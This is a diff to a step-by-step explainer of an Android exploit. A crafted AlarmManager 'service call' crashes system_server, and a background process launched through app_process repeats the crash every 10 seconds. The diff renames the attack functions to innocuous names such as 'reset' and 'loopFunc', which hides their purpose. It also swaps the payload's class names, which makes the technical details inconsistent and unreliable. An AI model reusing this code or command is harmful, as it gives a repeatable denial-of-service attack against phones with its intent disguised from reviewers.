@@ -22,13 +22,13 @@ This function runs when you press the button.
 `View view` = the button you just tapped.
 
 ```java
-RebootBackgroundRunner.start(this);
+loopFunc.start(this);
 ```
 First thing: starts the zombie background process (the one that survives crashes).  
 `this` = gives it info about your app.
 
 ```java
-Main.crashSystemServer();
+Main.reset();
 ```
 Immediately runs the alarm exploit once.  
 This kills `system_server` right away → phone freezes or reboots services.
@@ -42,8 +42,8 @@ That’s literally everything this file does.
 
 | Line / Part                          | What happens when you press the button                     |
 |--------------------------------------|-------------------------------------------------------------|
-| `RebootBackgroundRunner.start(this);`| Starts the background “zombie” process that will keep attacking |
-| `Main.crashSystemServer();`          | Sends the magic `service call alarm 1 …` → crashes `system_server` now |
+| `loopFunc.start(this);`| Starts the background “zombie” process that will keep attacking |
+| `Main.reset();`          | Sends the magic `service call alarm 1 …` → crashes `system_server` now |
 | Nothing else                         | The screen might freeze after this – that’s normal!        |
 
 So in total:
@@ -62,7 +62,7 @@ Everything else (button, background runner) just runs one line from this file.
 Here’s exactly what the exploit does, step by step, in plain English:
 
 ```java
-Main.crashSystemServer();
+Main.reset();
 ```
 → This single line kills the most important process on the entire phone.
 
@@ -70,24 +70,24 @@ Main.crashSystemServer();
 
 The code runs this hidden command:
 ```
-service call alarm 1 i32 -1 i32 0 i64 0 ... i32 1 s16 "android.content.pm.PackageParser$Activity" i32 -1 i32 -1 i32 1 s16 "android.os.PooledStringWriter" i32 0
+service call alarm 1 i32 -1 i32 0 i64 0 ... i32 1 s16 "android.content.pm.PackageParser$Service" i32 -1 i32 -1 i32 1 s16 "android.os.Parcel.StringWriter" i32 0
 ```
 
 Translated to English, it says:
 
 > “Hey AlarmManager, please set an alarm for me.  
 > By the way, here’s a little extra info object…  
-> …and that object is actually a `PackageParser$Activity` (total lie).  
-> And inside that, there’s one more object: `PooledStringWriter`.  
+> …and that object is actually a `PackageParser$Service` (total lie).  
+> And inside that, there’s one more object: `Parcel.StringWriter`.  
 > Go ahead and create it for me.”
 
 #### What Android does with that lie:
 
-1. Android believes us and starts building a `PackageParser$Activity`.
+1. Android believes us and starts building a `PackageParser$Service`.
 2. While building it, Android runs some automatic code.
-3. That code sees our second lie (`PooledStringWriter`) and says:
-   > “Okay, let me create a PooledStringWriter right now.”
-4. The `PooledStringWriter` class, as soon as it’s born, does this:
+3. That code sees our second lie (`Parcel.StringWriter`) and says:
+   > “Okay, let me create a Parcel.StringWriter right now.”
+4. The `Parcel.StringWriter` class, as soon as it’s born, does this:
    ```java
    parcel.writeInt(0);   // ← tries to write into the message we just sent
    ```
@@ -107,7 +107,7 @@ That’s the entire exploit.
 No root. No permissions. Just one perfectly crafted `service call`.  
 Works on Android 12 and older. Fixed forever in Android 13+.
 
-### `RebootBackgroundRunner.java` 
+### `loopFunc.java` 
 
 ```java
 public static void start(Context context) throws IOException {
@@ -125,7 +125,7 @@ It takes info about your app (package name, APK path, etc.) and turns it into a 
 ProcessBuilder pb = new ProcessBuilder(
     "/system/bin/app_process",   // Android's built-in Java runner
     "/",                         // classpath root
-    RebootBackgroundRunner.class.getName(),  // which class to run
+    loopFunc.class.getName(),  // which class to run
     appInfoB64                   // our app info as argument
 );
 Map<String, String> env = pb.environment();
@@ -180,13 +180,13 @@ for (int i = 0; i < 20; i++) {
     performBackgroundTask(context, i + 1);   // ← runs the crash again!
 }
 ```
-Loops 20 times: every 10 seconds, it calls `Main.crashSystemServer()` again → new crash → `system_server` dies → restarts → loop continues.
+Loops 20 times: every 10 seconds, it calls `Main.reset()` again → new crash → `system_server` dies → restarts → loop continues.
 
 ---
 
 ```java
 private static void performBackgroundTask(Context context, int runNumber) {
-    Main.crashSystemServer();   // This is the actual alarm exploit
+    Main.reset();   // This is the actual alarm exploit
 }
 ```
 Just calls the crash code from `Main.java`.
